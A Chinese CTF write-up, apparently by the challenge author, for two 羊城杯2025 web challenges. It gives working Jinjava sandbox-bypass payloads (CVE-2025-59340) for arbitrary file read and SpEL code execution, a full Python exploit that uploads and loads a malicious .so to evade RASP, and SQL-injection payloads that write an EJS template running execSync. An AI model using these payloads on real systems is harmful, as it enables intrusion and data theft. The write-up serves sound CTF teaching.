+++
date = '2025-10-13T14:00:00+08:00'
title = '羊城杯2025 金Java&ezsigin Writeup'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++

菜菜web手第一次给比赛出题，如果题目出的不太好或者有什么问题欢迎加我扣扣(58896863)拷打我



# 金Java

考点：CVE-2025-59340漏洞复现+RASP绕过

JinJava是一个基于django模板语法的Java 的模板引擎

前段时间出了一个CVE-2025-59340，偶然间看到了，有点意思，所以就拿来出题了。

![image-20251007231625490](../assets/image-20251007231625490.png)

官方给出的issue描述的很详细：[jinjava has Sandbox Bypass via JavaType-Based Deserialization · CVE-2025-59340 · GitHub Advisory Database](https://github.com/advisories/GHSA-m49c-g9wr-hv6v)

这里我们根据issue，通过java.net.URL可以实现任意文件的读取

第一步，构造一个JavaType类型的java.net.URL

```
{{ ____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical("java.net.URL")) }}
```

第二步，利用 Jackson 的 ObjectMapper中的readValue来调用java.net.URL的单参数且参数为String的构造方法

```
{{____int3rpr3t3r____.config.objectMapper.readValue('"file:///etc/passwd"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical("java.net.URL"))}}
```

接着链式调用得到的java.net.URL对象读文件

```
{{____int3rpr3t3r____.config.objectMapper.readValue('"file:///etc/passwd"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical("java.net.URL")).openStream().readAllBytes()}}
```

第三步，利用 Jackson 的 ObjectMapper中的convertValue将readAllBytes()返回的bytes转换成base64

```
{{ ____int3rpr3t3r____.config.objectMapper.convertValue(____int3rpr3t3r____.config.objectMapper.readValue('"file:///etc/passwd"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical("java.net.URL")).openStream().readAllBytes(),____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical("java.lang.String")) }}
```

![image-20251007233203834](../assets/image-20251007233203834.png)

实现任意文件读之后，可以利用file协议来看目录

查看根目录

```
{{ ____int3rpr3t3r____.config.objectMapper.convertValue(____int3rpr3t3r____.config.objectMapper.readValue('"file:/"',____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical("java.net.URL")).openStream().readAllBytes(),____int3rpr3t3r____.config.objectMapper.getTypeFactory().constructFromCanonical("java.lang.String")) }}
```

![image-20251007233338090](../assets/image-20251007233338090.png)

可以看到flag，但是没有权限读，需要RCE后去用readflag读

![image-20251007233506482](../assets/image-20251007233506482.png)

可以读cmdline或者直接看网站目录，可以看到这里上了Rasp

可以利用任意文件读将Rasp下载下来

![image-20251007233724418](../assets/image-20251007233724418.png)

这里把能命令执行的函数的办掉了

只是表面办了System#load，但是实际上可以利用Runtime#load或者更底层的方法去加载so，也就是利用比较常见的Rasp绕过方法，通过加载恶意so来绕过Rasp

参考文章：[浅谈Java-JNI如何加载动态库时直接执行恶意代码-先知社区](https://xz.aliyun.com/news/16528)

按照上面构造java.net.URL任意文件读取的方法，我们利用SpelExpressionParser来通过SpEL表达式实现任意代码执行

Payload如下

```
{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue('{}',i.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression("T(java.lang.Runtime).getRuntime().load('/app/expe.so')").getValue() }}
```

接着就是写文件，SpelExpressionParser对表达式有长度限制(10000)，我们需要分段上传

> 本意是题目不出网，通过写文件的方式去加载so。但是实际比赛的时候题目是出网的，所以可以直接加载远程的so。

完整EXP

```python
import base64
import re

import requests

def split_and_encode_file(path: str, chunk_size: int = 600):
    with open(path, "rb") as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            yield base64.b64encode(chunk).decode("ascii")

path = "exp.so"
templates = """{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue('{}',i.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression("T(java.nio.file.Files).write(T(java.nio.file.Paths).get('expe.so'), T(java.util.Base64).getDecoder().decode('content'),T(java.nio.file.StandardOpenOption).CREATE,T(java.nio.file.StandardOpenOption).APPEND)").getValue() }}"""

burp0_url = "http://ip:port/"

for idx, part in enumerate(split_and_encode_file(path, chunk_size=7000)):
    template = templates.replace("content",part)
    burp0_data = {"name": template}
    post = requests.post(burp0_url, data=burp0_data)
    # print(post.text)

payload = """{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.readValue('{}',i.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression("T(java.lang.Runtime).getRuntime().load('/app/expe.so')").getValue() }}"""
post = requests.post(burp0_url, data={"name": payload})
# print(post.text)
payload = """{% set i=____int3rpr3t3r____.config.objectMapper %}{{ i.convertValue(i.readValue('"file:///tmp/123"',i.getTypeFactory().constructFromCanonical("java.net.URL")).openStream().readAllBytes(),i.getTypeFactory().constructFromCanonical("java.lang.String")) }}"""
post = requests.post(burp0_url, data={"name": payload})

base = re.search(r'<div>Hello,\s*(.*?)</div>', post.text).group(1)
print("FLAG："+ base64.b64decode(base).decode())
```



# ez_signin

这道题是我在大半年前还是大一的时候出的，本意是作为一道简单签到题的，因为没有比较困难或者比较新的考点，都是一些常规的利用，但是没想到解题数相对较少。

![image-20251008020759008](../assets/image-20251008020759008.png)

![image-20251008020810703](../assets/image-20251008020810703.png)

拿到题目是一个登录/注册

注册的用户没有权限，可以在登陆处直接万能密码登录到admin

![image-20251008020942647](../assets/image-20251008020942647.png)

登进去之后是一个文件列表，下载处存在目录穿越

![image-20251008021010630](../assets/image-20251008021010630.png)

目录穿越有waf，但是不是很严格，可以直接../app.js读上层目录拿源码

```js
const express = require('express');
const session = require('express-session');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const app = express();
const db = new sqlite3.Database('./db.sqlite');

/*
FLAG in /fla4444444aaaaaagg.txt
*/

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: 'welcometoycb2025',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }
}));

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');


const checkPermission = (req, res, next) => {
  if (req.path === '/login' || req.path === '/register') return next();
  if (!req.session.user) return res.redirect('/login');
  if (!req.session.user.isAdmin) return res.status(403).send('无权限访问');
  next();
};

app.use(checkPermission);

app.get('/', (req, res) => {
  fs.readdir(path.join(__dirname, 'documents'), (err, files) => {
    if (err) {
      console.error('读取目录时发生错误:', err);
      return res.status(500).send('目录读取失败');
    }
    req.session.files = files;
    res.render('files', { files, user: req.session.user });
  });
});

app.get('/login', (req, res) => {
  res.render('login');
});

app.get('/register', (req, res) => {
  res.render('register');
});

app.get('/upload', (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    res.render('upload', { user: req.session.user });
    //todoing
});

app.get('/logout', (req, res) => {
  req.session.destroy(err => {
    if (err) {
      console.error('退出时发生错误:', err);
      return res.status(500).send('退出失败');
    }
    res.redirect('/login');
  });
});

app.post('/login', async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    const sql = `SELECT * FROM users WHERE (username = "${username}") AND password = ("${password}")`;
    db.get(sql,async (err, user) => {
        if (!user) {
            return res.status(401).send('账号密码出错！！');
        }
        req.session.user = { id: user.id, username: user.username, isAdmin: user.is_admin };
        res.redirect('/');
    });
});



app.post('/register', (req, res) => {
  const { username, password, confirmPassword } = req.body;
  
  if (password !== confirmPassword) {
    return res.status(400).send('两次输入的密码不一致');
  }
  
  db.exec(`INSERT INTO users (username, password) VALUES ('${username}', '${password}')`, function(err) {
    if (err) {
      console.error('注册失败:', err);
      return res.status(500).send('注册失败，用户名可能已存在');
    }
    res.redirect('/login');
  });
});

app.get('/download', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  const filename = req.query.filename;
  if (filename.startsWith('/')||filename.startsWith('./')) {
    return res.status(400).send('WAF');
  }
  if (filename.includes('../../')||filename.includes('.././')||filename.includes('f')||filename.includes('//')) {
    return res.status(400).send('WAF');
  }
  if (!filename || path.isAbsolute(filename) ) {
    return res.status(400).send('无效文件名');
  }
  const filePath = path.join(__dirname, 'documents', filename);
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).send('文件不存在');
  }
});



const PORT = 80;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

可以看到upload是没有ejs文件的

![image-20251008021633861](../assets/image-20251008021633861.png)

而且在login和register处是存在sql注入的

但是这里有一个坑就是login处的db.get函数不支持执行多条sql语句，也就是说不能堆叠注入。而在register处的db.exec是支持的。

所以我们可以在register处通过sqlite创建数据库文件的方式，去写ejs模板，打ejs模板渲染

payload

```
admin');ATTACH DATABASE '/app/views/upload.ejs' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('<h1><%- include("/fla4444444aaaaaagg.txt"); %></h1>');/*
```

![image-20251008022232879](../assets/image-20251008022232879.png)

也可以直接RCE去读

```
123');ATTACH DATABASE '/app/views/upload.ejs' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('<h1><%=process.mainModule.require("child_process").execSync("cat /fla4444444aaaaaagg.txt") %></h1>');/*
```

